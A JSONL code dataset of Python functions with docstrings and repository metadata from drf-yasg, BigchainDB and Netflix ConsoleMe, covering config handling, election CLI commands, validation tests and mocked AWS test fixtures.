{"docstring": "# see https://github.com/axnsan12/drf-yasg/issues/270\n# test that manual form parameters for views that haven't set\n# all their parsers classes to form parsers are not allowed\n# even when the request body is empty\n\n", "func_signal": "def test_no_form_parameters_with_non_form_parsers():\n", "code": "@method_decorator(name='post', decorator=swagger_auto_schema(\n    operation_description=\"Logins a user and returns a token\",\n    manual_parameters=[\n        openapi.Parameter(\n            \"username\",\n            openapi.IN_FORM,\n            required=True,\n            type=openapi.TYPE_STRING,\n            description=\"Valid username or email for authentication\"\n        ),\n    ]\n))\nclass CustomObtainAuthToken(ObtainAuthToken):\n    throttle_classes = api_settings.DEFAULT_THROTTLE_CLASSES\n\nurlpatterns = [\n    path('token/', CustomObtainAuthToken.as_view()),\n]\n\ngenerator = OpenAPISchemaGenerator(\n    info=openapi.Info(title=\"Test generator\", default_version=\"v1\"),\n    patterns=urlpatterns\n)\n\nwith pytest.raises(SwaggerGenerationError):\n    generator.get_schema(None, True)", "path": "drf-yasg/tests/test_form_parameters.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Check if a given object is a dict that maintains insertion order.\n\n:param obj: the dict object to check\n:rtype: bool\n\"\"\"\n", "func_signal": "def dict_has_ordered_keys(obj):\n", "code": "if sys.version_info >= (3, 7):\n    # the Python 3.7 language spec says that dict must maintain insertion order.\n    return isinstance(obj, dict)\n\nreturn isinstance(obj, OrderedDict)", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Note this only compatible with Tendermint 0.19.x\"\"\"\n", "func_signal": "def public_key64_to_address(base64_public_key):\n", "code": "ed25519_public_key = public_key_from_base64(base64_public_key)\nencoded_public_key = amino_encoded_public_key(ed25519_public_key)\nreturn hashlib.new('ripemd160', encoded_public_key).hexdigest().upper()", "path": "bigchaindb/bigchaindb/tendermint_utils.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Return a new configuration with the values found in the environment.\n\nThe function recursively iterates over the config, checking if there is\na matching env variable. If an env variable is found, the func updates\nthe configuration with that value.\n\nThe name of the env variable is built combining a prefix (``BIGCHAINDB``)\nwith the path to the value. If the ``config`` in input is:\n``{'database': {'host': 'localhost'}}``\nthis function will try to read the env variable ``BIGCHAINDB_DATABASE_HOST``.\n\"\"\"\n\n", "func_signal": "def env_config(config):\n", "code": "def load_from_env(value, path):\n    var_name = CONFIG_SEP.join([CONFIG_PREFIX] + list(map(lambda s: s.upper(), path)))\n\n    return os.environ.get(var_name, value)\n\nreturn map_leafs(load_from_env, config)", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Decorator to be used by command line functions, such that the\nconfiguration of bigchaindb is performed before the execution of\nthe command.\n\nArgs:\n    command: The command to decorate.\n\nReturns:\n    The command wrapper function.\n\n\"\"\"\n", "func_signal": "def configure_bigchaindb(command):\n", "code": "@functools.wraps(command)\ndef configure(args):\n    config_from_cmdline = None\n    try:\n        if args.log_level is not None:\n            config_from_cmdline = {\n                'log': {\n                    'level_console': args.log_level,\n                    'level_logfile': args.log_level,\n                },\n                'server': {'loglevel': args.log_level},\n            }\n    except AttributeError:\n        pass\n    bigchaindb.config_utils.autoconfigure(\n        filename=args.config, config=config_from_cmdline, force=True)\n    command(args)\n\nreturn configure", "path": "bigchaindb/bigchaindb/commands/utils.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Approve an election\n\n:param args: dict\n    args = {\n    'election_id': the election_id of the election (str)\n    'sk': the path to the private key of the signer (str)\n    }\n:param bigchain: an instance of BigchainDB\n:return: success log message or `False` in case of error\n\"\"\"\n\n", "func_signal": "def run_election_approve(args, bigchain):\n", "code": "key = load_node_key(args.sk)\ntx = bigchain.get_transaction(args.election_id)\nvoting_powers = [v.amount for v in tx.outputs if key.public_key in v.public_keys]\nif len(voting_powers) > 0:\n    voting_power = voting_powers[0]\nelse:\n    logger.error('The key you provided does not match any of the eligible voters in this election.')\n    return False\n\ninputs = [i for i in tx.to_inputs() if key.public_key in i.owners_before]\nelection_pub_key = ValidatorElection.to_public_key(tx.id)\napproval = Vote.generate(inputs,\n                         [([election_pub_key], voting_power)],\n                         tx.id).sign([key.private_key])\napproval.validate(bigchain)\n\nresp = bigchain.write_transaction(approval, BROADCAST_TX_COMMIT)\n\nif resp == (202, ''):\n    logger.info('[SUCCESS] Your vote has been submitted')\n    return approval.id\nelse:\n    logger.error('Failed to commit vote')\n    return False", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "# Coerce a value to the `current` type.\n", "func_signal": "def _coerce(current, value):\n", "code": "try:\n    # First we try to apply current to the value, since it\n    # might be a function\n    return current(value)\nexcept TypeError:\n    # Then we check if current is a list AND if the value\n    # is a string.\n    if isinstance(current, list) and isinstance(value, str):\n        # If so, we use the colon as the separator\n        return value.split(list_sep)\n\n    try:\n        # If we are here, we should try to apply the type\n        # of `current` to the value\n        return type(current)(value)\n    except TypeError:\n        # Worst case scenario we return the value itself.\n        return value", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Write the provided configuration to a specific location.\n\nArgs:\n    config (dict): a dictionary with the configuration to load.\n    filename (str): the name of the file that will store the new configuration. Defaults to ``None``.\n        If ``None``, the HOME of the current user and the string ``.bigchaindb`` will be used.\n\"\"\"\n", "func_signal": "def write_config(config, filename=None):\n", "code": "if not filename:\n    filename = CONFIG_DEFAULT_PATH\n\nwith open(filename, 'w') as f:\n    json.dump(config, f, indent=4)", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Show the current configuration\"\"\"\n# TODO Proposal: remove the \"hidden\" configuration. Only show config. If\n# the system needs to be configured, then display information on how to\n# configure the system.\n", "func_signal": "def run_show_config(args):\n", "code": "config = copy.deepcopy(bigchaindb.config)\ndel config['CONFIGURED']\nprint(json.dumps(config, indent=4, sort_keys=True))", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Try to connect to the database.\n\nRaises:\n    :exc:`~ConnectionError`: If the connection to the database\n        fails.\n\"\"\"\n\n", "func_signal": "def connect(self):\n", "code": "attempt = 0\nfor i in self.max_tries_counter:\n    attempt += 1\n    try:\n        self._conn = self._connect()\n    except ConnectionError as exc:\n        logger.warning('Attempt %s/%s. Connection to %s:%s failed after %sms.',\n                       attempt, self.max_tries if self.max_tries != 0 else '\u221e',\n                       self.host, self.port, self.connection_timeout)\n        if attempt == self.max_tries:\n            logger.critical('Cannot connect to the Database. Giving up.')\n            raise ConnectionError() from exc\n    else:\n        break", "path": "bigchaindb/bigchaindb/backend/connection.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Find and load the chosen validation plugin.\n\nArgs:\n    name (string): the name of the entry_point, as advertised in the\n        setup.py of the providing package.\n\nReturns:\n    an uninstantiated subclass of ``bigchaindb.validation.AbstractValidationRules``\n\"\"\"\n", "func_signal": "def load_validation_plugin(name=None):\n", "code": "if not name:\n    return BaseValidationRules\n\n# TODO: This will return the first plugin with group `bigchaindb.validation`\n#       and name `name` in the active WorkingSet.\n#       We should probably support Requirements specs in the config, e.g.\n#       validation_plugin: 'my-plugin-package==0.0.1;default'\nplugin = None\nfor entry_point in iter_entry_points('bigchaindb.validation', name):\n    plugin = entry_point.load()\n\n# No matching entry_point found\nif not plugin:\n    raise ResolutionError(\n        'No plugin found in group `bigchaindb.validation` with name `{}`'.\n        format(name))\n\n# Is this strictness desireable?\n# It will probably reduce developer headaches in the wild.\nif not issubclass(plugin, (BaseValidationRules,)):\n    raise TypeError('object of type \"{}\" does not implement `bigchaindb.'\n                    'validation.BaseValidationRules`'.format(type(plugin)))\n\nreturn plugin", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Initiates an election to add/update/remove a validator to an existing BigchainDB network\n\n:param args: dict\n    args = {\n    'public_key': the public key of the proposed peer, (str)\n    'power': the proposed validator power for the new peer, (str)\n    'node_id': the node_id of the new peer (str)\n    'sk': the path to the private key of the node calling the election (str)\n    }\n:param bigchain: an instance of BigchainDB\n:return: election_id or `False` in case of failure\n\"\"\"\n\n", "func_signal": "def run_election_new_upsert_validator(args, bigchain):\n", "code": "new_validator = {\n    'public_key': {'value': public_key_from_base64(args.public_key),\n                   'type': 'ed25519-base16'},\n    'power': args.power,\n    'node_id': args.node_id\n}\n\nreturn create_new_election(args.sk, bigchain, ValidatorElection, new_validator)", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Retrieves information about an election\n\n:param args: dict\n    args = {\n    'election_id': the transaction_id for an election (str)\n    }\n:param bigchain: an instance of BigchainDB\n\"\"\"\n\n", "func_signal": "def run_election_show(args, bigchain):\n", "code": "election = bigchain.get_transaction(args.election_id)\nif not election:\n    logger.error(f'No election found with election_id {args.election_id}')\n    return\n\nresponse = election.show_election(bigchain)\n\nlogger.info(response)\n\nreturn response", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Computes the merkle root for a given list.\n\nArgs:\n    hashes (:obj:`list` of :obj:`bytes`): The leaves of the tree.\n\nReturns:\n    str: Merkle root in hexadecimal form.\n\n\"\"\"\n# XXX TEMPORARY -- MUST REVIEW and possibly CHANGE\n# The idea here is that the UTXO SET would be empty and this function\n# would be invoked to compute the merkle root, and since there is nothing,\n# i.e. an empty list, then the hash of the empty string is returned.\n# This seems too easy but maybe that is good enough? TO REVIEW!\n", "func_signal": "def merkleroot(hashes):\n", "code": "if not hashes:\n    return sha3_256(b'').hexdigest()\n# XXX END TEMPORARY -- MUST REVIEW ...\nif len(hashes) == 1:\n    return hexlify(hashes[0]).decode()\nif len(hashes) % 2 == 1:\n    hashes.append(hashes[-1])\nparent_hashes = [\n    sha3_256(hashes[i] + hashes[i+1]).digest()\n    for i in range(0, len(hashes)-1, 2)\n]\nreturn merkleroot(parent_hashes)", "path": "bigchaindb/bigchaindb/tendermint_utils.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Update bigchaindb.config with whatever is in the provided config dict,\nand then set bigchaindb.config['CONFIGURED'] = True\n\nArgs:\n    config (dict): the config dict to read for changes\n                   to the default config\n\"\"\"\n\n# Update the default config with whatever is in the passed config\n", "func_signal": "def update_config(config):\n", "code": "update(bigchaindb.config, update_types(config, bigchaindb.config))\nbigchaindb.config['CONFIGURED'] = True", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Set bigchaindb.config equal to the default config dict,\nthen update that with whatever is in the provided config dict,\nand then set bigchaindb.config['CONFIGURED'] = True\n\nArgs:\n    config (dict): the config dict to read for changes\n                   to the default config\n\nNote:\n    Any previous changes made to ``bigchaindb.config`` will be lost.\n\"\"\"\n# Deep copy the default config into bigchaindb.config\n", "func_signal": "def set_config(config):\n", "code": "bigchaindb.config = copy.deepcopy(bigchaindb._config)\n# Update the default config with whatever is in the passed config\nupdate(bigchaindb.config, update_types(config, bigchaindb.config))\nbigchaindb.config['CONFIGURED'] = True", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Recursively update a mapping (i.e. a dict, list, set, or tuple).\n\nConceptually, d and u are two sets trees (with nodes and edges).\nThis function goes through all the nodes of u. For each node in u,\nif d doesn't have that node yet, then this function adds the node from u,\notherwise this function overwrites the node already in d with u's node.\n\nArgs:\n    d (mapping): The mapping to overwrite and add to.\n    u (mapping): The mapping to read for changes.\n\nReturns:\n    mapping: An updated version of d (updated by u).\n\"\"\"\n", "func_signal": "def update(d, u):\n", "code": "for k, v in u.items():\n    if isinstance(v, collections.abc.Mapping):\n        r = update(d.get(k, {}), v)\n        d[k] = r\n    else:\n        d[k] = u[k]\nreturn d", "path": "bigchaindb/bigchaindb/config_utils.py", "commit_date": "2020-07-22 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Drop the database\"\"\"\n", "func_signal": "def run_drop(args):\n", "code": "dbname = bigchaindb.config['database']['name']\n\nif not args.yes:\n    response = input_on_stderr('Do you want to drop `{}` database? [y/n]: '.format(dbname))\n    if response != 'y':\n        return\n\nconn = backend.connect()\ntry:\n    schema.drop_database(conn, dbname)\nexcept DatabaseDoesNotExist:\n    print(\"Cannot drop '{name}'. The database does not exist.\".format(name=dbname), file=sys.stderr)", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Show the supported Tendermint version(s)\"\"\"\n", "func_signal": "def run_tendermint_version(args):\n", "code": "supported_tm_ver = {\n    'description': 'BigchainDB supports the following Tendermint version(s)',\n    'tendermint': __tm_supported_versions__,\n}\nprint(json.dumps(supported_tm_ver, indent=4, sort_keys=True))", "path": "bigchaindb/bigchaindb/commands/bigchaindb.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "# If we try to fulfill a threshold condition where each subcondition has\n# the same key get_subcondition_from_vk will always return the first\n# subcondition. This means that only the 1st subfulfillment will be\n# generated\n# Creating threshold conditions with the same key does not make sense but\n# that does not mean that the code shouldn't work.\n\n", "func_signal": "def test_threshold_same_public_key(alice, b, user_pk, user_sk):\n", "code": "from bigchaindb.models import Transaction\n\n# CREATE divisible asset\ntx_create = Transaction.create([alice.public_key], [([user_pk, user_pk], 100)],\n                               asset={'name': random.random()})\ntx_create_signed = tx_create.sign([alice.private_key])\n\n# TRANSFER\ntx_transfer = Transaction.transfer(tx_create.to_inputs(), [([alice.public_key], 100)],\n                                   asset_id=tx_create.id)\ntx_transfer_signed = tx_transfer.sign([user_sk, user_sk])\n\nb.store_bulk_transactions([tx_create_signed])\n\nassert tx_transfer_signed.validate(b) == tx_transfer_signed\n\nb.store_bulk_transactions([tx_transfer_signed])\nwith pytest.raises(DoubleSpend):\n    tx_transfer_signed.validate(b)", "path": "bigchaindb/tests/assets/test_divisible_assets.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Utility function to execute a subcommand.\n\nThe function will look up in the ``scope``\nif there is a function called ``run_<parser.args.command>``\nand will run it using ``parser.args`` as first positional argument.\n\nArgs:\n    parser: an ArgumentParser instance.\n    argv: the list of command line arguments without the script name.\n    scope (dict): map containing (eventually) the functions to be called.\n\nRaises:\n    NotImplementedError: if ``scope`` doesn't contain a function called\n                         ``run_<parser.args.command>``.\n\"\"\"\n", "func_signal": "def start(parser, argv, scope):\n", "code": "args = parser.parse_args(argv)\n\nif not args.command:\n    parser.print_help()\n    raise SystemExit()\n\n# look up in the current scope for a function called 'run_<command>'\n# replacing all the dashes '-' with the lowercase character '_'\nfunc = scope.get('run_' + args.command.replace('-', '_'))\n\n# if no command has been found, raise a `NotImplementedError`\nif not func:\n    raise NotImplementedError('Command `{}` not yet implemented'.\n                              format(args.command))\n\nargs.multiprocess = getattr(args, 'multiprocess', False)\n\nif args.multiprocess is False:\n    args.multiprocess = 1\nelif args.multiprocess is None:\n    args.multiprocess = mp.cpu_count()\n\nreturn func(args)", "path": "bigchaindb/bigchaindb/commands/utils.py", "commit_date": "2020-04-06 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "# ## Set up a connection to BigchainDB\n# Check [test_basic.py](./test_basic.html) to get some more details\n# about the endpoint.\n", "func_signal": "def send_naughty_tx(asset, metadata):\n", "code": "bdb = BigchainDB(os.environ.get('BIGCHAINDB_ENDPOINT'))\n\n# Here's Alice.\nalice = generate_keypair()\n\n# Alice is in a naughty mood today, so she creates a tx with some naughty strings\nprepared_transaction = bdb.transactions.prepare(\n    operation='CREATE',\n    signers=alice.public_key,\n    asset=asset,\n    metadata=metadata)\n\n# She fulfills the transaction\nfulfilled_transaction = bdb.transactions.fulfill(\n    prepared_transaction,\n    private_keys=alice.private_key)\n\n# The fulfilled tx gets sent to the BDB network\ntry:\n    sent_transaction = bdb.transactions.send_commit(fulfilled_transaction)\nexcept BadRequest as e:\n    sent_transaction = e\n\n# If her key contained a '.', began with a '$', or contained a NUL character\nregex = '.*\\..*|\\$.*|.*\\x00.*'\nkey = next(iter(metadata))\nif re.match(regex, key):\n    # Then she expects a nicely formatted error code\n    status_code = sent_transaction.status_code\n    error = sent_transaction.error\n    regex = (\n        r'\\{\\s*\\n*'\n        r'\\s*\"message\":\\s*\"Invalid transaction \\(ValidationError\\):\\s*'\n        r'Invalid key name.*The key name cannot contain characters.*\\n*'\n        r'\\s*\"status\":\\s*400\\n*'\n        r'\\s*\\}\\n*')\n    assert status_code == 400\n    assert re.fullmatch(regex, error), sent_transaction\n# Otherwise, she expects to see her transaction in the database\nelif 'id' in sent_transaction.keys():\n    tx_id = sent_transaction['id']\n    assert bdb.transactions.retrieve(tx_id)\n# If neither condition was true, then something weird happened...\nelse:\n    raise TypeError(sent_transaction)", "path": "bigchaindb/acceptance/python/src/test_naughty_strings.py", "commit_date": "2020-06-02 00:00:00", "repo_name": "bigchaindb/bigchaindb", "stars": 4024, "license": "apache-2.0", "language": "python", "size": 10207}
{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_request_by_id(self, mock_auth, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_request_by_id\n\nmock_user = \"cnorris\"\nmock_requests = [\n    {\"username\": mock_user, \"status\": \"pending\"},\n    {\"username\": \"edward\", \"group\": \"group1\", \"status\": \"pending\"},\n    {\"username\": \"clair\", \"status\": \"approved\"},\n]\nmock_secondary_approver = [\"group1\"]\nmock_user_dynamo_handler.return_value.resolve_request_ids.return_value = (\n    mock_requests\n)\n\nmock_sa = Future()\nmock_sa.set_result(mock_secondary_approver)\nmock_auth.get_secondary_approvers.return_value = mock_sa\n\nrequests = asyncio.get_event_loop().run_until_complete(\n    get_request_by_id(mock_user, \"123456\")\n)\nself.assertEqual(\n    requests, mock_requests[0], \"Only the first request should be returned\"\n)", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked IAM Fixture.\"\"\"\n", "func_signal": "def iam(aws_credentials):\n", "code": "with mock_iam():\n    yield boto3.client(\"iam\", region_name=\"us-east-1\")", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_all_pending_requests_api(self, mock_auth, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_all_pending_requests_api\n\nmock_user = \"cnorris\"\nmock_requests = [\n    {\"username\": mock_user, \"status\": \"pending\"},\n    {\"username\": \"edward\", \"group\": \"group1\", \"status\": \"pending\"},\n    {\"username\": \"clair\", \"status\": \"approved\"},\n]\nmock_secondary_approver = {\"group1\": [\"group1\"]}\nmock_user_dynamo_handler.return_value.get_all_requests.return_value = (\n    create_future(mock_requests)\n)\n\nmock_auth.get_secondary_approvers.return_value = create_future(\n    mock_secondary_approver\n)\n\nrequests = asyncio.get_event_loop().run_until_complete(\n    get_all_pending_requests_api(mock_user)\n)\nself.assertEqual(\n    requests,\n    mock_requests[: len(mock_requests) - 1],\n    \"Only clair should be missing\",\n)", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "# Create the table:\n", "func_signal": "def users_table(dynamodb):\n", "code": "dynamodb.create_table(\n    TableName=\"consoleme_users_global\",\n    AttributeDefinitions=[{\"AttributeName\": \"username\", \"AttributeType\": \"S\"}],\n    KeySchema=[{\"AttributeName\": \"username\", \"KeyType\": \"HASH\"}],\n    ProvisionedThroughput={\"ReadCapacityUnits\": 1000, \"WriteCapacityUnits\": 1000},\n)\n\nyield dynamodb", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_existing_pending_request_fail_status(self, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_existing_pending_request\n\nmock_user = \"cnorris\"\ngroup_info = Group(**{\"name\": \"group1\"})\nmock_requests = [\n    {\"username\": mock_user, \"status\": \"pending\"},\n    {\"username\": \"edward\", \"group\": \"group1\", \"status\": \"cancelled\"},\n    {\"username\": \"clair\", \"group\": \"group2\", \"status\": \"approved\"},\n]\n\nmock_user_dynamo_handler.return_value.get_requests_by_user.return_value = (\n    mock_requests\n)\n\nrequest = asyncio.get_event_loop().run_until_complete(\n    get_existing_pending_request(mock_user, group_info)\n)\nself.assertEqual(request, None, \"No matches - bad status\")", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked DynamoDB Fixture.\"\"\"\n", "func_signal": "def dynamodb(aws_credentials):\n", "code": "with mock_dynamodb2():\n    # Remove the config value for the DynamoDB Server\n    from consoleme.config.config import CONFIG\n\n    old_value = CONFIG.config.pop(\"dynamodb_server\", None)\n\n    yield boto3.client(\"dynamodb\", region_name=\"us-east-1\")\n\n    # Reset the config value:\n    CONFIG.config[\"dynamodb_server\"] = old_value", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Update a role policy\"\"\"\n\n", "func_signal": "def update_role(event):\n", "code": "with open(event, \"r\") as f:\n    event_data = json.load(f)\n\nfor e in event_data:\n    e[\"requestor\"] = e[\"requestor\"].format(requestor=get_session_name())\n\nresult = async_to_sync(update_role_handler)(event_data, None)\n\nif result.get(\"success\", False):\n    log.info(\"Role policy update successful\")\nelse:\n    log.info(\"Role policy update failed\")", "path": "consoleme/consoleme/lib/role_updater/cli.py", "commit_date": "2020-05-19 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked Config Fixture.\"\"\"\n", "func_signal": "def aws_config(aws_credentials):\n", "code": "with mock_config():\n    yield boto3.client(\"config\", region_name=\"us-east-1\")", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mock the retry library so that it doesn't retry.\"\"\"\n\n", "func_signal": "def retry():\n", "code": "class MockRetry:\n    def __init__(self, *args, **kwargs):\n        pass\n\n    def call(self, f, *args, **kwargs):\n        return f(*args, **kwargs)\n\npatch_retry = patch(\"retrying.Retrying\", MockRetry)\nyield patch_retry.start()\n\npatch_retry.stop()", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "# Create the table:\n", "func_signal": "def iamrole_table(dynamodb):\n", "code": "dynamodb.create_table(\n    TableName=\"consoleme_iamroles_global\",\n    AttributeDefinitions=[\n        {\"AttributeName\": \"arn\", \"AttributeType\": \"S\"},\n        {\"AttributeName\": \"accountId\", \"AttributeType\": \"S\"},\n    ],\n    KeySchema=[\n        {\"AttributeName\": \"arn\", \"KeyType\": \"HASH\"},\n        {\"AttributeName\": \"accountId\", \"KeyType\": \"RANGE\"},\n    ],\n    ProvisionedThroughput={\"ReadCapacityUnits\": 1000, \"WriteCapacityUnits\": 1000},\n)\n\n# Apply a TTL:\ndynamodb.update_time_to_live(\n    TableName=\"consoleme_iamroles_global\",\n    TimeToLiveSpecification={\"Enabled\": True, \"AttributeName\": \"ttl\"},\n)\n\nyield dynamodb", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Set a session name if running locally.\"\"\"\n", "func_signal": "def get_session_name():\n", "code": "if platform.platform().lower().startswith(\"darwin\"):\n    session_name = getpass.getuser()\n    return session_name\n\nreturn \"roleupdater\"", "path": "consoleme/consoleme/lib/role_updater/cli.py", "commit_date": "2020-05-19 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked SES Fixture.\"\"\"\n", "func_signal": "def ses(aws_credentials):\n", "code": "with mock_ses():\n    client = boto3.client(\"ses\", region_name=\"us-east-1\")\n    client.verify_email_address(EmailAddress=\"consoleme_test@example.com\")\n    yield client", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"\nYields successive n=zied chunks from list l by looping\nuntil length l.\n\n`divide_chunks([\"a\",\"b\",\"c\",\"d\",\"e\"], 2)` yields:\n['a', 'b', 'c']\n['d', 'e']\n\"\"\"\n", "func_signal": "def divide_chunks(list_, n):\n", "code": "for i in range(0, len(list_), n):\n    yield list_[i : i + n]", "path": "consoleme/consoleme/lib/generic.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Chuck Norris has a request and is an secondary approver for group1\"\"\"\n", "func_signal": "def test_get_existing_pending_request_fail_group(self, mock_user_dynamo_handler):\n", "code": "from consoleme.lib.requests import get_existing_pending_request\n\nmock_user = \"cnorris\"\ngroup_info = Group(**{\"name\": \"group1\"})\nmock_requests = [\n    {\"username\": mock_user, \"status\": \"pending\"},\n    {\"username\": \"edward\", \"group\": \"group5\", \"status\": \"pending\"},\n    {\"username\": \"clair\", \"group\": \"group2\", \"status\": \"approved\"},\n]\n\nmock_user_dynamo_handler.return_value.get_requests_by_user.return_value = (\n    mock_requests\n)\n\nrequest = asyncio.get_event_loop().run_until_complete(\n    get_existing_pending_request(mock_user, group_info)\n)\nself.assertEqual(request, None, \"No matches - no group match\")", "path": "consoleme/tests/lib/test_requests.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
{"docstring": "\"\"\"Mocked SQS Fixture.\"\"\"\n", "func_signal": "def sqs(aws_credentials):\n", "code": "with mock_sqs():\n    yield boto3.client(\"sqs\", region_name=\"us-east-1\")", "path": "consoleme/tests/conftest.py", "commit_date": "2020-12-31 00:00:00", "repo_name": "Netflix/consoleme", "stars": 3056, "license": "apache-2.0", "language": "python", "size": 34825}
